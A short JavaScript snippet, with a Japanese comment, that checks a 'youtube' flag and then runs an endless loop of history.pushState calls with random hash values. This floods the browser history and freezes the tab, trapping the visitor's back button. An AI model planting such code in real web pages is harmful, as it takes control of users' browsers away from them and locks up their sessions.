function history1() {
    if (youtube === true) {
        setInterval(() => {
            while (youtube===true) { 
                history.pushState(null, null, "#" + Math.random());
            }
        }, 1); // 1ミリ秒は非常に短いです。必要に応じてこの値を調整してください。
    }
}

if (youtube === true) {
    history1();
}
